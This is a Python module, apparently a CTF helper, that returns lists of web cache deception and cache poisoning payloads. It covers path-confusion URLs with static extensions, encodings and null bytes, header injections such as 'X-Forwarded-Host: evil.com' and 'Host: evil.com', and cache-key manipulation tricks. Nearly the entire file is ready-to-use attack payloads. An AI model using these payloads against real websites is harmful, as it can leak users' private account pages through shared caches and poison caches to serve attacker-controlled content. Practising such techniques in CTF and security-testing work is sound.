"""
Web Cache Deception Payload Crafter for Web CTF.
Covers cache poisoning via path confusion, X-Forwarded-Host injection,
and cache key manipulation techniques.
"""

from typing import List, Dict


def get_web_cache_deception_payloads(target_path: str = "/account") -> List[Dict[str, str]]:
    """Generate Web Cache Deception payloads."""
    return [
        {
            "name": "Path Confusion (Static Extension)",
            "payload": f"{target_path}/nonexistent.css",
            "desc": "Appends a static extension to trick cache into storing dynamic content."
        },
        {
            "name": "Path Confusion (Image Extension)",
            "payload": f"{target_path}/nonexistent.jpg",
            "desc": "Appends image extension to cache dynamic page."
        },
        {
            "name": "Path Confusion (JS Extension)",
            "payload": f"{target_path}/nonexistent.js",
            "desc": "Appends JS extension to cache dynamic page."
        },
        {
            "name": "Path Confusion (Trailing Slash + Extension)",
            "payload": f"{target_path}//nonexistent.css",
            "desc": "Double slash + extension to bypass path normalization."
        },
        {
            "name": "Path Confusion (Semicolon)",
            "payload": f"{target_path};.css",
            "desc": "Semicolon path parameter confusion."
        },
        {
            "name": "Path Confusion (Query String)",
            "payload": f"{target_path}?nonexistent.css",
            "desc": "Query string with static extension."
        },
        {
            "name": "Path Confusion (Encoded Extension)",
            "payload": f"{target_path}/nonexistent%2ecss",
            "desc": "URL-encoded dot in extension."
        },
        {
            "name": "Path Confusion (Double Encoded)",
            "payload": f"{target_path}/nonexistent%252ecss",
            "desc": "Double URL-encoded extension."
        },
        {
            "name": "Path Confusion (Unicode Extension)",
            "payload": f"{target_path}/nonexistent\u3000.css",
            "desc": "Unicode whitespace before extension."
        },
        {
            "name": "Path Confusion (Null Byte)",
            "payload": f"{target_path}/nonexistent%00.css",
            "desc": "Null byte before extension (legacy)."
        }
    ]


def get_cache_poisoning_payloads() -> List[Dict[str, str]]:
    """Generate cache poisoning payloads via header injection."""
    return [
        {
            "name": "X-Forwarded-Host Poisoning",
            "payload": "X-Forwarded-Host: evil.com",
            "desc": "Injects malicious host into cached response."
        },
        {
            "name": "X-Forwarded-Scheme Poisoning",
            "payload": "X-Forwarded-Scheme: http",
            "desc": "Forces HTTP scheme in cached response."
        },
        {
            "name": "X-Original-URL Poisoning",
            "payload": "X-Original-URL: /admin",
            "desc": "Overrides the original URL in cache key."
        },
        {
            "name": "X-Rewrite-URL Poisoning",
            "payload": "X-Rewrite-URL: /admin",
            "desc": "Rewrites the URL in cache key."
        },
        {
            "name": "Host Header Poisoning",
            "payload": "Host: evil.com",
            "desc": "Injects malicious Host header into cached response."
        },
        {
            "name": "X-Forwarded-Port Poisoning",
            "payload": "X-Forwarded-Port: 443",
            "desc": "Injects port into cached response."
        }
    ]


def get_cache_key_manipulation() -> List[Dict[str, str]]:
    """Generate cache key manipulation techniques."""
    return [
        {
            "name": "Unkeyed Header Injection",
            "payload": "Add unkeyed header (e.g. X-Forwarded-Host) that affects response",
            "desc": "If a header affects the response but is not part of the cache key, it can poison the cache."
        },
        {
            "name": "Unkeyed Query Parameter",
            "payload": "Add unkeyed query param that affects response",
            "desc": "If a query param affects the response but is not in the cache key, it can poison the cache."
        },
        {
            "name": "Cache Key Normalization Bypass",
            "payload": "Use different case/encoding that normalizes to same key",
            "desc": "Cache key normalization may treat different inputs as the same key."
        },
        {
            "name": "Separator Confusion",
            "payload": "Use ; or %3b as separator in path",
            "desc": "Different separators may be treated differently by cache vs origin."
        }
    ]
